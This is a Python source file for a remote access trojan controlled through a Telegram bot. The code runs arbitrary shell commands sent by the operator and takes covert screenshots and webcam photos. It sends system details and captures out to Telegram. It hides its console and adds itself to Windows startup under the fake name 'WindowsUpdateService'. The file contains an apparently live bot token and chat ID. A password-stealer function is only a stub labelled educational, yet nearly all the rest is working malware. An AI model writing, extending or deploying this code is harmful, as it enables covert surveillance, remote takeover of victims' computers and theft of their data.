import requests
import subprocess
import os
import time
import json
import base64
import tempfile
from datetime import datetime

# ==================== КОНФИГУРАЦИЯ ====================
BOT_TOKEN = "8670575283:AAF9osd3G4BaQGJ_QS5O_nbp9s3lED7tfHI"      # ЗАМЕНИТЕ НА РЕАЛЬНЫЙ
CHAT_ID = "8677229375"          # ЗАМЕНИТЕ НА РЕАЛЬНЫЙ
last_update_id = 0
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ==================== БАЗОВЫЕ ФУНКЦИИ ====================
def send_message(text, parse_mode=None):
    try:
        data = {"chat_id": CHAT_ID, "text": text[:4000]}
        if parse_mode:
            data["parse_mode"] = parse_mode
        requests.post(f"{API_URL}/sendMessage", data=data, timeout=10)
    except:
        pass

def send_document(filepath, caption=""):
    try:
        with open(filepath, "rb") as f:
            requests.post(f"{API_URL}/sendDocument", data={"chat_id": CHAT_ID, "caption": caption[:200]}, files={"document": f}, timeout=30)
    except:
        pass

def send_photo(filepath, caption=""):
    try:
        with open(filepath, "rb") as f:
            requests.post(f"{API_URL}/sendPhoto", data={"chat_id": CHAT_ID, "caption": caption[:200]}, files={"photo": f}, timeout=30)
    except:
        pass

# ==================== CMD ВЫПОЛНЕНИЕ ====================
def execute_cmd(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60, encoding='cp866', errors='ignore')
        output = result.stdout + result.stderr
        if not output.strip():
            output = "[✓] Команда выполнена (нет вывода)"
        return output[:3900]
    except subprocess.TimeoutExpired:
        return "[-] Ошибка: таймаут 60 сек"
    except Exception as e:
        return f"[-] Ошибка: {str(e)}"

# ==================== СКРИНШОТ ====================
def take_screenshot():
    try:
        import pyautogui
        screenshot = pyautogui.screenshot()
        temp_path = os.path.join(tempfile.gettempdir(), f"screenshot_{int(time.time())}.png")
        screenshot.save(temp_path)
        return temp_path
    except ImportError:
        return None
    except:
        return None

# ==================== ВЕБ-КАМЕРА ====================
def take_webcam_photo():
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        ret, frame = cap.read()
        if ret:
            temp_path = os.path.join(tempfile.gettempdir(), f"webcam_{int(time.time())}.jpg")
            cv2.imwrite(temp_path, frame)
            cap.release()
            return temp_path
        cap.release()
        return None
    except ImportError:
        return None
    except:
        return None

# ==================== СБОР ИНФОРМАЦИИ ====================
def get_system_info():
    info = {}
    try:
        info["hostname"] = os.environ.get("COMPUTERNAME", "Unknown")
        info["username"] = os.environ.get("USERNAME", "Unknown")
        info["os"] = subprocess.run("ver", shell=True, capture_output=True, text=True).stdout.strip()[:100]
        info["ip"] = requests.get("https://api.ipify.org", timeout=5).text
    except:
        info["ip"] = "Unknown"
    return info

def steal_chrome_passwords():
    # ПУСТАЯ ЗАГЛУШКА — реальная реализация требует decrypt
    return "Chrome passwords: requires decryption (educational demo)"

# ==================== ОБРАБОТЧИК КОМАНД ====================
def process_command(text):
    text = text.strip().lower()
    
    # /cmd <команда>
    if text.startswith("/cmd"):
        command = text[4:].strip()
        if command:
            result = execute_cmd(command)
            send_message(f"📟 $ {command}\n\n{result}")
        else:
            send_message("❌ Использование: /cmd <команда>\nПример: /cmd ipconfig")
    
    # /screenshot
    elif text == "/screenshot":
        send_message("📸 Делаю скриншот...")
        path = take_screenshot()
        if path and os.path.exists(path):
            send_photo(path, "Screenshot taken")
            os.remove(path)
        else:
            send_message("❌ Не удалось сделать скриншот. Установите: pip install pyautogui")
    
    # /webcam
    elif text == "/webcam":
        send_message("📷 Активирую веб-камеру...")
        path = take_webcam_photo()
        if path and os.path.exists(path):
            send_photo(path, "Webcam photo")
            os.remove(path)
        else:
            send_message("❌ Не удалось сделать фото. Установите: pip install opencv-python")
    
    # /info
    elif text == "/info":
        info = get_system_info()
        msg = f"💻 **System Info**\n\n🖥️ Hostname: {info['hostname']}\n👤 User: {info['username']}\n🔧 OS: {info['os']}\n🌐 IP: {info['ip']}"
        send_message(msg, parse_mode="Markdown")
    
    # /help
    elif text == "/help":
        help_text = """🤖 **Telegram RAT - Доступные команды:**

📟 `/cmd <команда>` — выполнить CMD
📸 `/screenshot` — скриншот экрана
📷 `/webcam` — фото с веб-камеры
💻 `/info` — информация о системе
❌ `/kill` — остановить бота

🔧 **Примеры:**
`/cmd whoami`
`/cmd dir C:\\`
`/cmd tasklist`"""
        send_message(help_text, parse_mode="Markdown")
    
    # /kill
    elif text == "/kill":
        send_message("🛑 Bot shutting down...")
        os._exit(0)
    
    else:
        send_message("❌ Неизвестная команда. Используйте /help")

# ==================== ПОЛУЧЕНИЕ ОБНОВЛЕНИЙ ====================
def get_updates():
    global last_update_id
    try:
        params = {"offset": last_update_id + 1, "timeout": 25}
        r = requests.get(f"{API_URL}/getUpdates", params=params, timeout=30)
        data = r.json()
        
        if data.get("ok"):
            for update in data.get("result", []):
                last_update_id = update["update_id"]
                message = update.get("message", {})
                
                if message.get("chat", {}).get("id") == CHAT_ID:
                    text = message.get("text", "")
                    if text:
                        process_command(text)
    except Exception as e:
        pass

# ==================== ПЕРСИСТЕНТНОСТЬ ====================
def add_to_startup():
    try:
        import winreg
        exe_path = os.path.abspath(sys.argv[0])
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except:
        pass

def hide_console():
    if os.name == "nt":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ==================== MAIN ====================
if __name__ == "__main__":
    hide_console()
    add_to_startup()
    send_message("🟢 **Telegram RAT Activated**\nИспользуйте /help для списка команд", parse_mode="Markdown")
    
    while True:
        get_updates()
        time.sleep(0.5)
